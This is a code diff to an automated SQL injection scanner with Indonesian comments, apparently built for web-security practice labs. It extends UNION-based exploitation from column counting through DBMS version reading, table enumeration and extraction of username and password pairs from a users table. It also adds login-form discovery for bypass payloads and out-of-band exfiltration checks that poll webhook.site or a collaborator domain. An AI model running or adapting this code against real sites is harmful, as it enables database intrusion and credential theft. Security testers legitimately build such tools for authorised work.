@@ -3305,6 +3305,7 @@ SQLI_DBMS_TAGS = {"oracle": "oracle", "mysql": "mysql_mssql", "mssql": "mysql_ms
 _SQLI_HOST_BUDGET: dict[str, int] = {}
 _SQLI_TIME_HOSTS: set[str] = set()
 _SQLI_ERROR_HOSTS: set[str] = set()
+_SQLI_OAST_HOSTS: set[str] = set()
 
 
 def _sqli_budget_key(ctx) -> str:
@@ -3805,25 +3806,42 @@ def _sqli_union_payload(point, columns, index, expr, suffix=""):
 
 
 def _sqli_union_phase(sess, ctx, point, base, out):
+    """UNION bertingkat: kolom -> kolom teks -> versi -> enumerasi -> kredensial.
+
+    Setiap tahap yang terbukti dicatat sebagai temuan tersendiri. Versi DBMS
+    bukan akhir pemeriksaan: lab "listing database contents" dan "retrieving
+    data from other tables" memakai injeksi yang sama, jadi setelah versi
+    terbaca pemeriksaan harus lanjut ke enumerasi tabel dan kredensial.
+    """
     columns = 0
     for n in range(1, 9):
+        if not _sqli_take(ctx):
+            return
         resp = _sqli_send(sess, ctx, point, _sqli_value(point, f"' ORDER BY {n}-- -"))
         if resp is None:
             return
         sql_error = bool(_sqli_dbms(resp)[0]) or (
             resp.status_code >= 500 and b"error" in resp.content.lower())
         if sql_error:
-            # Kolom terbukti hanya bila penambahan indeks ORDER BY memicu error
-            # SQL yang spesifik; aplikasi non-SQL yang sekadar mengembalikan
-            # halaman kosong tidak boleh dianggap memiliki N kolom.
             columns = n - 1
             break
     if columns <= 0:
         return
 
+    base_body = _sqli_body(base)
+    out.append(_sqli_finding(
+        ctx, {"union", "column_count"},
+        f"UNION-based SQL injection — jumlah kolom query ({columns}) pada "
+        f"{point['label']}", "high",
+        f"ORDER BY 1..{columns} valid dan ORDER BY {columns + 1} memicu error SQL; "
+        f"query mengembalikan {columns} kolom sehingga UNION SELECT dapat disusun.",
+        "active_sqli_union_column_count"))
+
     # Kolom yang dapat memuat teks (canary harus muncul di respons).
     text_index = -1
     for index in range(columns):
+        if not _sqli_take(ctx):
+            return
         payload = _sqli_union_payload(point, columns, index, f"'{CANARY}'")
         resp = _sqli_send(sess, ctx, point, payload)
         if resp is None:
@@ -3832,102 +3850,98 @@ def _sqli_union_phase(sess, ctx, point, base, out):
             text_index = index
             break
 
-    base_body = _sqli_body(base)
-    if text_index >= 0:
-        # a) versi DBMS
-        # Urutan penting: Oracle hanya mengenal v$version, MySQL/MSSQL sama-sama
-        # memakai @@version, dan PostgreSQL memakai version(). Menaruh version()
-        # lebih dulu membuat lab MySQL salah diatribusikan tanpa tag mysql_mssql.
-        version_specs = [
-            ("oracle", "banner", " FROM v$version"),
-            ("mysql", "@@version", ""),
-            ("mssql", "@@version", ""),
-            ("postgresql", "version()", ""),
-        ]
-        for dbms, expr, suffix in version_specs:
-            payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
-            resp = _sqli_send(sess, ctx, point, payload)
-            if resp is None:
-                return
-            match = DB_VERSION_RE.search(_sqli_body(resp))
-            if match and match.group(0).lower() not in base_body.lower():
-                tags = {"union", "db_version"}
-                if dbms in SQLI_DBMS_TAGS:
-                    tags.add(SQLI_DBMS_TAGS[dbms])
-                out.append(_sqli_finding(
-                    ctx, tags,
-                    f"UNION-based SQL injection — versi DBMS ({dbms}) terbaca "
-                    f"pada {point['label']}", "high",
-                    f"{columns} kolom ditentukan (ORDER BY/UNION NULL); payload {payload!r} "
-                    f"mengembalikan penanda versi {match.group(0)!r}.",
-                    "active_sqli_union_version"))
-                return
-
-        # b) enumerasi tabel (information_schema / all_tables)
-        dump_specs = [
-            ("postgresql", "'CANARY'||table_name", " FROM information_schema.tables", "information_schema"),
-            ("mysql", "CONCAT('CANARY',table_name)", " FROM information_schema.tables", "information_schema"),
-            ("mssql", "'CANARY'+table_name", " FROM information_schema.tables", "information_schema"),
-            ("oracle", "'CANARY'||table_name", " FROM all_tables", "all_tables"),
-        ]
-        for dbms, expr, suffix, dump_tag in dump_specs:
-            payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
-            resp = _sqli_send(sess, ctx, point, payload)
-            if resp is None:
-                return
-            names = [m.group(1) for m in SQLI_TABLE_RE.finditer(_sqli_body(resp))]
-            if names:
-                tags = {"union", "db_dump", dump_tag}
-                if dbms in SQLI_DBMS_TAGS:
-                    tags.add(SQLI_DBMS_TAGS[dbms])
-                out.append(_sqli_finding(
-                    ctx, tags,
-                    f"UNION-based SQL injection — enumerasi tabel database ({dbms}) "
-                    f"pada {point['label']}", "high",
-                    f"Payload {payload!r} mengembalikan nama tabel: "
-                    f"{', '.join(dict.fromkeys(names))[:300]}.",
-                    "active_sqli_union_db_dump"))
-                return
-
-        # c) kredensial dari tabel lain (users)
-        cred_specs = [
-            ("postgresql", "'CANARY'||username||'~'||password", " FROM users"),
-            ("mysql", "CONCAT('CANARY',username,'~',password)", " FROM users"),
-            ("mssql", "'CANARY'+username+'~'+password", " FROM users"),
-            ("oracle", "'CANARY'||username||'~'||password", " FROM users"),
-        ]
-        for dbms, expr, suffix in cred_specs:
-            payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
-            resp = _sqli_send(sess, ctx, point, payload)
-            if resp is None:
-                return
-            match = SQLI_CRED_RE.search(_sqli_body(resp))
-            if match:
-                tag = "multi_value" if columns == 1 else "other_tables"
-                out.append(_sqli_finding(
-                    ctx, {"union", tag},
-                    f"UNION-based SQL injection — data tabel lain terbaca ({dbms}) "
-                    f"pada {point['label']}", "high",
-                    f"{columns} kolom; payload {payload!r} mengembalikan pasangan "
-                    f"kredensial '{match.group(1)}' / hash sepanjang {len(match.group(2))} karakter.",
-                    "active_sqli_union_credentials"))
-                return
-
-        out.append(_sqli_finding(
-            ctx, {"union", "text_column"},
-            f"UNION-based SQL injection — kolom teks ditemukan pada {point['label']}", "high",
-            f"Query mengembalikan {columns} kolom dan canary {CANARY!r} berhasil "
-            "ditempatkan pada salah satu kolom teks respons.",
-            "active_sqli_union_text_column"))
+    if text_index < 0:
         return
 
     out.append(_sqli_finding(
-        ctx, {"union", "column_count"},
-        f"UNION-based SQL injection — jumlah kolom query ({columns}) pada "
-        f"{point['label']}", "high",
-        f"ORDER BY/UNION NULL menentukan query mengembalikan {columns} kolom, "
-        "sehingga UNION SELECT dapat disusun.",
-        "active_sqli_union_column_count"))
+        ctx, {"union", "text_column"},
+        f"UNION-based SQL injection — kolom teks ditemukan pada {point['label']}", "high",
+        f"Query mengembalikan {columns} kolom dan canary {CANARY!r} berhasil "
+        f"ditempatkan pada kolom ke-{text_index + 1} respons.",
+        "active_sqli_union_text_column"))
+
+    # a) versi DBMS. Urutan: Oracle (v$version), MySQL/MSSQL (@@version),
+    #    PostgreSQL (version()).
+    version_specs = [
+        ("oracle", "banner", " FROM v$version"),
+        ("mysql", "@@version", ""),
+        ("mssql", "@@version", ""),
+        ("postgresql", "version()", ""),
+    ]
+    for dbms, expr, suffix in version_specs:
+        if not _sqli_take(ctx):
+            return
+        payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
+        resp = _sqli_send(sess, ctx, point, payload)
+        if resp is None:
+            return
+        match = DB_VERSION_RE.search(_sqli_body(resp))
+        if match and match.group(0).lower() not in base_body.lower():
+            tags = {"union", "db_version"}
+            if dbms in SQLI_DBMS_TAGS:
+                tags.add(SQLI_DBMS_TAGS[dbms])
+            out.append(_sqli_finding(
+                ctx, tags,
+                f"UNION-based SQL injection — versi DBMS ({dbms}) terbaca "
+                f"pada {point['label']}", "high",
+                f"{columns} kolom ditentukan (ORDER BY/UNION NULL); payload {payload!r} "
+                f"mengembalikan penanda versi {match.group(0)!r}.",
+                "active_sqli_union_version"))
+            break
+
+    # b) enumerasi tabel (information_schema / all_tables)
+    dump_specs = [
+        ("postgresql", "'CANARY'||table_name", " FROM information_schema.tables", "information_schema"),
+        ("mysql", "CONCAT('CANARY',table_name)", " FROM information_schema.tables", "information_schema"),
+        ("mssql", "'CANARY'+table_name", " FROM information_schema.tables", "information_schema"),
+        ("oracle", "'CANARY'||table_name", " FROM all_tables", "all_tables"),
+    ]
+    for dbms, expr, suffix, dump_tag in dump_specs:
+        if not _sqli_take(ctx):
+            return
+        payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
+        resp = _sqli_send(sess, ctx, point, payload)
+        if resp is None:
+            return
+        names = [m.group(1) for m in SQLI_TABLE_RE.finditer(_sqli_body(resp))]
+        if names:
+            tags = {"union", "db_dump", dump_tag}
+            if dbms in SQLI_DBMS_TAGS:
+                tags.add(SQLI_DBMS_TAGS[dbms])
+            out.append(_sqli_finding(
+                ctx, tags,
+                f"UNION-based SQL injection — enumerasi tabel database ({dbms}) "
+                f"pada {point['label']}", "high",
+                f"Payload {payload!r} mengembalikan nama tabel: "
+                f"{', '.join(dict.fromkeys(names))[:300]}.",
+                "active_sqli_union_db_dump"))
+            break
+
+    # c) kredensial dari tabel lain (users)
+    cred_specs = [
+        ("postgresql", "'CANARY'||username||'~'||password", " FROM users"),
+        ("mysql", "CONCAT('CANARY',username,'~',password)", " FROM users"),
+        ("mssql", "'CANARY'+username+'~'+password", " FROM users"),
+        ("oracle", "'CANARY'||username||'~'||password", " FROM users"),
+    ]
+    for dbms, expr, suffix in cred_specs:
+        if not _sqli_take(ctx):
+            return
+        payload = _sqli_union_payload(point, columns, text_index, expr, suffix)
+        resp = _sqli_send(sess, ctx, point, payload)
+        if resp is None:
+            return
+        match = SQLI_CRED_RE.search(_sqli_body(resp))
+        if match:
+            tag = "multi_value" if columns == 1 else "other_tables"
+            out.append(_sqli_finding(
+                ctx, {"union", tag},
+                f"UNION-based SQL injection — data tabel lain terbaca ({dbms}) "
+                f"pada {point['label']}", "high",
+                f"{columns} kolom; payload {payload!r} mengembalikan pasangan "
+                f"kredensial '{match.group(1)}' / hash sepanjang {len(match.group(2))} karakter.",
+                "active_sqli_union_credentials"))
+            return
 
 
 # ── 7. login bypass ─────────────────────────────────────────────────────────
@@ -3948,14 +3962,70 @@ def _sqli_login_success(resp) -> bool:
     return any(marker in body for marker in SQLI_LOGIN_SUCCESS)
 
 
-def _sqli_login_phase(sess, ctx, out):
-    for form in ctx.forms or []:
-        inputs = form.get("inputs") or []
-        if not any(str(i.get("type") or "").lower() == "password" for i in inputs):
+def _sqli_login_page_forms(sess, ctx):
+    """Cari form login di halaman yang ditautkan (mis. /login) bila ctx tidak punya.
+
+    Lab "login bypass" menaruh form di /login sementara pemindaian sering mulai
+    dari halaman toko, sehingga form password tidak ada di HTML awal.
+    """
+    urls = []
+    for match in re.finditer(r"""href=["']([^"']{1,200})["']""", ctx.html or "", re.I):
+        url = ctx.abs_url(match.group(1))
+        if re.search(r"(login|signin|sign-in|sign_in|session|account)", url, re.I):
+            urls.append(url)
+    for path in ("/login", "/signin", "/sign-in"):
+        urls.append(ctx.abs_url(path))
+    origin = urlparse(ctx.url).netloc.lower()
+    found = []
+    for url in list(dict.fromkeys(urls))[:4]:
+        if urlparse(url).netloc.lower() != origin:
             continue
-        action = ctx.abs_url(str(form.get("action") or ctx.url))
+        if not _sqli_take(ctx):
+            break
+        resp = _sqli_http(sess, ctx, "GET", url)
+        if resp is None or not resp.ok:
+            continue
+        soup = BeautifulSoup(resp.text or "", "html.parser")
+        for form in soup.find_all("form"):
+            inputs = []
+            for el in form.find_all(["input", "textarea", "button"]):
+                inputs.append({
+                    "name": el.get("name") or "",
+                    "type": (el.get("type") or el.name or "").lower(),
+                    "value": el.get("value") or "",
+                })
+            if not any(i["type"] == "password" for i in inputs):
+                continue
+            action = str(form.get("action") or url)
+            found.append({
+                "action": urljoin(url, action),
+                "method": (form.get("method") or "post").lower(),
+                "inputs": inputs,
+            })
+        if found:
+            break
+    return found
+
+
+def _sqli_login_phase(sess, ctx, out):
+    forms = [f for f in (ctx.forms or [])
+             if any(str(i.get("type") or "").lower() == "password"
+                    for i in f.get("inputs") or [])]
+    if not forms:
+        try:
+            forms = _sqli_login_page_forms(sess, ctx)
+        except Exception:
+            forms = []
+    seen_actions = set()
+    for form in forms:
+        action = str(form.get("action") or ctx.url)
+        if not action.startswith(("http://", "https://")):
+            action = ctx.abs_url(action)
         if urlparse(action).netloc.lower() != urlparse(ctx.url).netloc.lower():
             continue
+        if action in seen_actions:
+            continue
+        seen_actions.add(action)
         fields = [(name, value) for name, value, _typ in _sqli_form_fields(form)]
         if not fields:
             continue
@@ -3966,10 +4036,14 @@ def _sqli_login_phase(sess, ctx, out):
         if pass_field:
             data[pass_field] = "satria-probe-password"
         data[user_field] = "satria_probe_user"
+        if not _sqli_take(ctx):
+            return
         baseline = _sqli_http(sess, ctx, "POST", action, data=data)
         if baseline is None or _sqli_login_success(baseline):
             continue
         for payload in SQLI_LOGIN_PAYLOADS:
+            if not _sqli_take(ctx):
+                return
             attempt = dict(data)
             attempt[user_field] = payload
             resp = _sqli_http(sess, ctx, "POST", action, data=attempt)
@@ -3988,7 +4062,7 @@ def _sqli_login_phase(sess, ctx, out):
 
 # ── 8. XML / filter bypass via entity encoding ──────────────────────────────
 def _sqli_xml_endpoints(ctx):
-    haystack = (ctx.js_text or "") + "\n" + (ctx.html or "")
+    haystack = ((ctx.js_text or "") + "\n" + (ctx.html or "") + "\n" + (ctx.url or ""))
     if not re.search(r"(stockCheck|storeId|productId|checkStock|\bsoap\b)", haystack, re.I):
         return []
     origin = urlparse(ctx.url).netloc.lower()
@@ -4198,7 +4272,7 @@ def _sqli_webhook_payloads(token: str, base_url: str):
 
 def _sqli_webhook_read(uuid_: str, token: str) -> list[tuple[str, str]]:
     url = f"https://webhook.site/token/{uuid_}/requests?sorting=newest"
-    for attempt in range(6):
+    for attempt in range(3):
         hits: list[tuple[str, str]] = []
         try:
             resp = requests.get(url, timeout=6, headers={"User-Agent": UA})
@@ -4216,7 +4290,7 @@ def _sqli_webhook_read(uuid_: str, token: str) -> list[tuple[str, str]]:
             pass
         if hits:
             return hits
-        if attempt < 5:
+        if attempt < 2:
             time.sleep(3)
     return []
 
@@ -4224,6 +4298,19 @@ def _sqli_webhook_read(uuid_: str, token: str) -> list[tuple[str, str]]:
 def _sqli_oob_phase(sess, ctx, points, out):
     if not points:
         return
+    # OOB hanya relevan bila belum ada bukti injeksi langsung: lab OOB murni
+    # tidak memiliki sinyal UNION/waktu/error/boolean. Ini menghemat polling
+    # belasan detik pada target yang sudah terbukti.
+    strong = {"union", "time_based", "error_based", "where", "login_bypass",
+              "conditional_responses", "conditional_errors", "xml_encoded"}
+    if any(strong & set(f.get("tags") or []) for f in out):
+        return
+    # Polling webhook/collaborator mahal. Cukup sekali per host: halaman kedua
+    # pada origin yang sama tidak menambah bukti OOB.
+    host_key = _sqli_budget_key(ctx)
+    if host_key in _SQLI_OAST_HOSTS:
+        return
+    _SQLI_OAST_HOSTS.add(host_key)
     domain = SQLI_OAST_DOMAIN
     if domain and SQLI_OAST_API:
         token = "satria" + os.urandom(4).hex()
@@ -4235,6 +4322,7 @@ def _sqli_oob_phase(sess, ctx, points, out):
                     sent += 1
         if not sent:
             return
+        _SQLI_OAST_HOSTS.add(host_key)
         hosts = _sqli_oast_hosts(_sqli_oast_poll())
         marker = token + "." + domain
         leaked = [h for h in hosts
@@ -4281,6 +4369,7 @@ def _sqli_oob_phase(sess, ctx, points, out):
                 sent += 1
     if not sent:
         return
+    _SQLI_OAST_HOSTS.add(host_key)
     hits = _sqli_webhook_read(hook["uuid"], token)
     values = [v for kind, v in hits if kind == "exfil" and v]
     if values:
@@ -4341,17 +4430,20 @@ def a_sqli_deep(ctx):
         try:
             _sqli_error_phase(session, ctx, point, base, findings)
             _sqli_cast_phase(session, ctx, point, base, findings)
-            _sqli_boolean_phase(session, ctx, point, base, findings)
             _sqli_cond_error_phase(session, ctx, point, base, findings)
             _sqli_where_phase(session, ctx, point, base, findings)
             if not union_done and index < 3:
                 _sqli_union_phase(session, ctx, point, base, findings)
                 union_done = bool(any("union" in f.get("tags", []) for f in findings))
-            if not time_done and index < 3:
+            if not time_done and index < 2:
                 _sqli_time_phase(session, ctx, point, base, findings)
                 time_done = bool(any("time_based" in f.get("tags", []) for f in findings))
                 if time_done:
                     _SQLI_TIME_HOSTS.add(_sqli_budget_key(ctx))
+            # Fase boolean paling mahal (differensial dua putaran), jadi
+            # dijalankan terakhir agar tidak menghabiskan kuota fase lain.
+            if index < 2 and not any("conditional_responses" in f.get("tags", []) for f in findings):
+                _sqli_boolean_phase(session, ctx, point, base, findings)
         except Exception as exc:
             ctx.http_log.append({"phase": "sqli", "error": f"{type(exc).__name__}: {exc}"[:200]})
 
@@ -5397,6 +5489,7 @@ def run_lab_scan(ctx) -> dict[str, Any]:
     _SQLI_HOST_BUDGET.clear()
     _SQLI_TIME_HOSTS.clear()
     _SQLI_ERROR_HOSTS.clear()
+    _SQLI_OAST_HOSTS.clear()
     # Cakupan bukan hanya halaman awal: jelajahi tautan, halaman, dan form GET
     # pada origin yang sama, lalu jalankan keluarga probe pada setiap konteks.
     page_contexts = _discover_same_origin_contexts(ctx)
